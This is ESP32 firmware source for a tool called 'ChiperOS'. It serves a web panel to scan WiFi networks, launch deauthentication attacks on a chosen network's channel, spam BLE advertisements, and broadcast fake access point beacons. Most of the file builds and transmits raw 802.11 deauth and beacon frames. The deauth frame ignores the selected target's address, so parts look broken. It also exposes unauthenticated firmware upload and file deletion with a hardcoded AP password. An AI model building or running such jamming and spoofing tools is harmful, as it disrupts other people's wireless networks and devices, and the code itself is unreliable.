#include <WiFi.h>
#include <WebServer.h>
#include <LittleFS.h>
#include <Update.h>
#include <ArduinoJson.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <esp_wifi.h>
#include <esp_random.h>

// === PINS ===
#define LED_PIN   47
#define BTN1      45
#define BTN2      46

WebServer server(80);

const char* ssid = "ChiperOS";
const char* pass = "plusX123";
IPAddress ip(192, 100, 0, 1);

// === VARIABLES ===
bool deauthRunning = false;
bool bleSpamRunning = false;
bool fakeAPRunning = false;

// Deauth Frame
uint8_t deauthFrame[26];
String targetSSID = "";
int targetChannel = 1;

// BLE
unsigned long lastBlePacket = 0;

// Fake AP
String fakeAPNames[6] = {"LOL_BRO", "LOL_BRO", "LOL_BRO", "LOL_BRO", "LOL_BRO", "LOL_BRO"};
int fakeAPCount = 6;
unsigned long lastFakeAPSend = 0;

// Scan
int scanCount = 0;
String scanSSIDs[20];
String scanBSSIDs[20];
int scanRSSIs[20];
int scanChannels[20];

// Forward Declarations
void initDeauthFrame();
void sendDeauthPacket();
void sendBLESpam();void sendFakeAP();
void handleScan();
void handleDeauthStart();
void handleDeauthStop();
void handleBLEStart();
void handleBLEStop();
void handleFakeAPStart();
void handleFakeAPStop();
void handleFakeAPConfig();
void handleUpload();
void handleFileList();
void handleDeleteFile();

// === HTML (COMPACTED) ===
const char* html = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>ChiperOS</title><style>
*{margin:0;padding:0;box-sizing:border-box}body{background:#0d1117;color:#58a6ff;font-family:monospace;padding:20px}
h1{color:#7ee787;text-align:center;margin-bottom:20px}.card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:15px;margin-bottom:15px}
h2{color:#58a6ff;font-size:16px;margin-bottom:10px;border-bottom:1px solid #30363d;padding-bottom:5px}
.btn{padding:8px 15px;border:none;border-radius:5px;cursor:pointer;margin:5px;font-weight:bold;color:#fff}
.btn-p{background:#238636}.btn-d{background:#da3633}.btn-w{background:#9e6a03}.btn-s{background:#3fb950;color:#000}
.net{background:#0d1117;border:1px solid #21262d;border-radius:5px;padding:10px;margin:5px 0;cursor:pointer}
.net:hover{border-color:#58a6ff}.net.s{border-color:#3fb950;background:#1a2f1a}
.st{padding:10px;border-radius:5px;margin:10px 0;text-align:center}.st-on{background:#238636}.st-off{background:#30363d}
input{background:#0d1117;color:#fff;border:1px solid #30363d;padding:8px;border-radius:5px;margin:5px 0;width:100%}
.f{background:#0d1117;padding:10px;margin:5px 0;border-radius:5px;display:flex;justify-content:space-between}
#log{background:#0d1117;padding:10px;border-radius:5px;margin-top:10px;font-size:12px;min-height:40px}
</style></head><body>
<h1>🛡️ ChiperOS</h1>
<div class="card"><h2>📡 WiFi Scan</h2><button class="btn btn-p" onclick="scan()">🔍 Scan</button><div id="nets">No networks</div></div>
<div class="card"><h2>📶 Deauth</h2><div id="dSt" class="st st-off">OFF</div><button class="btn btn-d" id="dB" onclick="togD()">▶ Start</button></div>
<div class="card"><h2>🦷 BLE Spam</h2><div id="bSt" class="st st-off">OFF</div><button class="btn btn-w" id="bB" onclick="togB()">▶ Start</button></div>
<div class="card"><h2>📡 Fake AP</h2><div id="fSt" class="st st-off">OFF</div><input id="fN" value="LOL_BRO,LOL_BRO,LOL_BRO,LOL_BRO,LOL_BRO,LOL_BRO"><button class="btn btn-s" id="fB" onclick="togF()">▶ Start</button><button class="btn btn-p" onclick="saveF()">💾 Save</button></div>
<div class="card"><h2>📂 Files</h2><div id="fl">Loading...</div><form method="POST" action="/upload" enctype="multipart/form-data"><input type="file" name="firmware"><button type="submit" class="btn btn-p">📤 Upload</button></form></div>
<div class="card"><h2>ℹ️ Info</h2><div id="inf">Loading...</div></div>
<div id="log">Ready</div>
<script>
let selN=0,dA=false,bA=false,fA=false;
function log(m){document.getElementById('log').innerHTML='⏱ '+m;}
function scan(){log('🔍 Scanning...');fetch('/api/scan').then(r=>r.json()).then(d=>{
  let h='';for(let i=0;i<d.c;i++)h+='<div class="net" onclick="sel('+i+')"><b>'+d.s[i]+'</b><br>'+d.b[i]+' | '+d.r[i]+'dBm</div>';
  document.getElementById('nets').innerHTML=h;log('Found '+d.c);});}
function sel(i){selN=i;document.querySelectorAll('.net').forEach((e,x)=>e.classList.toggle('s',x==i));}
function togD(){dA=!dA;let b=document.getElementById('dB'),s=document.getElementById('dSt');
  if(dA){fetch('/api/deauth/start?n='+selN).then(()=>{b.innerText='⏹ Stop';b.className='btn btn-w';s.className='st st-on';s.innerText='ON';});}
  else{fetch('/api/deauth/stop').then(()=>{b.innerText='▶ Start';b.className='btn btn-d';s.className='st st-off';s.innerText='OFF';});}}
function togB(){bA=!bA;let b=document.getElementById('bB'),s=document.getElementById('bSt');
  if(bA){fetch('/api/ble/start').then(()=>{b.innerText='⏹ Stop';s.className='st st-on';s.innerText='ON';});}
  else{fetch('/api/ble/stop').then(()=>{b.innerText='▶ Start';s.className='st st-off';s.innerText='OFF';});}}function togF(){fA=!fA;let b=document.getElementById('fB'),s=document.getElementById('fSt');
  if(fA){fetch('/api/fakeap/start').then(()=>{b.innerText='⏹ Stop';s.className='st st-on';s.innerText='ON';});}
  else{fetch('/api/fakeap/stop').then(()=>{b.innerText='▶ Start';s.className='st st-off';s.innerText='OFF';});}}
function saveF(){fetch('/api/fakeap/config?n='+encodeURIComponent(document.getElementById('fN').value));log('Saved');}
function ref(){fetch('/api/files').then(r=>r.json()).then(d=>{
  let h='';d.f.forEach(x=>h+='<div class="f"><span>'+x.n+'</span><button class="btn btn-d" onclick="del(\''+x.n+'\')">🗑</button></div>');
  document.getElementById('fl').innerHTML=h||'Empty';});
  fetch('/api/info').then(r=>r.json()).then(d=>{document.getElementById('inf').innerHTML='Heap: '+d.h+'B<br>Up: '+d.u+'s';});}
function del(n){if(confirm('Del?'))fetch('/api/del?f='+n).then(ref);}
setInterval(ref,3000);ref();
</script></body></html>
)rawliteral";

void setup() {
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, HIGH); // LED ON during boot
  delay(1000);
  
  Serial.begin(115200);
  Serial.println("\n=== ChiperOS Boot ===");
  
  if (!LittleFS.begin(true)) Serial.println("⚠️ LittleFS format");
  
  WiFi.softAPConfig(ip, ip, IPAddress(255, 255, 255, 0));
  WiFi.softAP(ssid, pass);
  Serial.printf("✅ AP: %s | IP: %s\n", ssid, ip.toString().c_str());
  
  esp_wifi_set_promiscuous(true);
  initDeauthFrame();
  
  // --- WEB SERVER ---
  server.on("/", HTTP_GET, []() {
    Serial.println(">>> HTTP GET /"); // DEBUG
    server.send(200, "text/html", html);
  });
  
  server.on("/api/scan", HTTP_GET, handleScan);
  server.on("/api/deauth/start", HTTP_GET, handleDeauthStart);
  server.on("/api/deauth/stop", HTTP_GET, handleDeauthStop);
  server.on("/api/ble/start", HTTP_GET, handleBLEStart);
  server.on("/api/ble/stop", HTTP_GET, handleBLEStop);
  server.on("/api/fakeap/start", HTTP_GET, handleFakeAPStart);
  server.on("/api/fakeap/stop", HTTP_GET, handleFakeAPStop);
  server.on("/api/fakeap/config", HTTP_GET, handleFakeAPConfig);
  server.on("/api/files", HTTP_GET, handleFileList);
  server.on("/api/info", HTTP_GET, []() {
    String j = "{\"h\":" + String(ESP.getFreeHeap()) + ",\"u\":" + String(millis()/1000) + "}";
    server.send(200, "application/json", j);
  });
  server.on("/api/del", HTTP_GET, handleDeleteFile);  
  server.on("/upload", HTTP_POST, 
    []() { server.send(200, "text/plain", "OK"); },
    handleUpload
  );
  
  server.begin();
  Serial.println("✅ Server ready");
  
  BLEDevice::init("ESP32-S3");
  
  digitalWrite(LED_PIN, LOW); // LED OFF after boot
  Serial.println("=== READY ===");
}

void loop() {
  server.handleClient(); // MUST be first
  
  if (deauthRunning && millis() % 100 < 20) sendDeauthPacket(); // ~10 packets/sec
  if (bleSpamRunning && millis() - lastBlePacket > 100) { lastBlePacket = millis(); sendBLESpam(); }
  if (fakeAPRunning && millis() - lastFakeAPSend > 200) { lastFakeAPSend = millis(); sendFakeAP(); }
  
  // LED Blink
  if (deauthRunning || bleSpamRunning || fakeAPRunning) {
    digitalWrite(LED_PIN, (millis() / 500) % 2);
  } else {
    digitalWrite(LED_PIN, LOW);
  }
  
  yield();
}

// === FUNCTIONS ===
void initDeauthFrame() {
  deauthFrame[0]=0xC0; deauthFrame[1]=0x00; deauthFrame[2]=0x3A; deauthFrame[3]=0x01;
  memset(&deauthFrame[4], 0xFF, 6); // Dest
  deauthFrame[10]=0xA2; deauthFrame[11]=0xB4; deauthFrame[12]=0xC5; 
  deauthFrame[13]=0xD6; deauthFrame[14]=0xE7; deauthFrame[15]=0xF3; // Src
  memcpy(&deauthFrame[16], &deauthFrame[10], 6); // BSSID
  deauthFrame[24]=0x02; deauthFrame[25]=0x00; // Reason
}

void sendDeauthPacket() {
  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
  deauthFrame[22] = esp_random() & 0xFF;
  deauthFrame[23] = (esp_random() >> 8) & 0xFF;
  esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, 26, false);
}

void sendBLESpam() {  BLEAdvertising* p = BLEDevice::getAdvertising();
  p->stop();
  p->addServiceUUID(BLEUUID((uint16_t)(0x1800 + (esp_random() % 0x100))));
  p->setMinPreferred(0x06); p->setMaxPreferred(0x12);
  p->start();
}

void sendFakeAP() {
  static int idx = 0;
  uint8_t b[128]; memset(b, 0, 128);
  b[0]=0x80; b[1]=0x00;
  memset(&b[4], 0xFF, 6);
  b[10]=0x02; b[11]=0x00; b[12]=0x00; b[13]=0x00; b[14]=0x00; b[15]=idx;
  memcpy(&b[16], &b[10], 6);
  uint64_t ts = millis() * 1000; memcpy(&b[24], &ts, 8);
  b[32]=0xE8; b[33]=0x03; b[34]=0x01; b[35]=0x00;
  int p = 36;
  String s = fakeAPNames[idx % fakeAPCount];
  b[p++] = 0x00; b[p++] = s.length();
  memcpy(&b[p], s.c_str(), s.length()); p += s.length();
  b[p++]=0x01; b[p++]=0x08; b[p++]=0x82; b[p++]=0x84; b[p++]=0x8B; b[p++]=0x96;
  b[p++]=0x24; b[p++]=0x30; b[p++]=0x48; b[p++]=0x6C;
  esp_wifi_80211_tx(WIFI_IF_AP, b, p, false);
  idx = (idx + 1) % fakeAPCount;
}

void handleScan() {
  scanCount = WiFi.scanNetworks();
  String j = "{\"c\":" + String(scanCount) + ",\"s\":[";
  String b="\"b\":[", r="\"r\":[", ch="\"ch\":[";
  for (int i=0; i<scanCount && i<20; i++) {
    if(i>0){j+=",";b+=",";r+=",";ch+=",";}
    j+="\""+WiFi.SSID(i)+"\""; b+="\""+WiFi.BSSIDstr(i)+"\"";
    r+=WiFi.RSSI(i); ch+=WiFi.channel(i);
    scanSSIDs[i]=WiFi.SSID(i); scanBSSIDs[i]=WiFi.BSSIDstr(i);
    scanRSSIs[i]=WiFi.RSSI(i); scanChannels[i]=WiFi.channel(i);
  }
  j+="],"+b+"],"+r+"],"+ch+"]}";
  server.send(200, "application/json", j);
}

void handleDeauthStart() {
  int n = server.arg("n").toInt();
  if (n >= 0 && n < scanCount) {
    targetChannel = scanChannels[n];
    deauthRunning = true;
    Serial.println("Deauth ON: " + scanSSIDs[n]);
  }
  server.send(200, "text/plain", "OK");
}void handleDeauthStop() { deauthRunning = false; server.send(200, "text/plain", "OK"); }
void handleBLEStart() { bleSpamRunning = true; server.send(200, "text/plain", "OK"); }
void handleBLEStop() { bleSpamRunning = false; BLEDevice::getAdvertising()->stop(); server.send(200, "text/plain", "OK"); }
void handleFakeAPStart() { fakeAPRunning = true; server.send(200, "text/plain", "OK"); }
void handleFakeAPStop() { fakeAPRunning = false; server.send(200, "text/plain", "OK"); }
void handleFakeAPConfig() {
  String n = server.arg("n");
  int idx=0, st=0;
  for(int i=0; i<=n.length() && idx<6; i++) {
    if(i==n.length() || n.charAt(i)==',') { fakeAPNames[idx++]=n.substring(st,i); st=i+1; }
  }
  fakeAPCount = idx;
  server.send(200, "text/plain", "OK");
}

void handleUpload() {
  static File f;
  HTTPUpload& u = server.upload();
  if (u.status == UPLOAD_FILE_START) {
    if (u.filename.endsWith(".bin")) Update.begin(UPDATE_SIZE_UNKNOWN, U_FLASH);
    else f = LittleFS.open("/" + u.filename, "w");
  } else if (u.status == UPLOAD_FILE_WRITE) {
    if (u.filename.endsWith(".bin")) Update.write(u.buf, u.currentSize);
    else if (f) f.write(u.buf, u.currentSize);
  } else if (u.status == UPLOAD_FILE_END) {
    if (u.filename.endsWith(".bin")) { if (Update.end(true)) Serial.println("OTA OK"); }
    else if (f) f.close();
  }
}

void handleFileList() {
  File r = LittleFS.open("/");
  String j="{\"f\":["; bool f=true;
  File x=r.openNextFile();
  while(x){
    if(!f)j+=",";
    j+="{\"n\":\""+String(x.name())+"\",\"s\":"+String(x.size())+"}";
    f=false; x=r.openNextFile();
  }
  j+="]}";
  server.send(200, "application/json", j);
}

void handleDeleteFile() {
  String f = server.arg("f");
  if (LittleFS.remove(f)) server.send(200, "text/plain", "OK");
  else server.send(500, "text/plain", "Err");
}
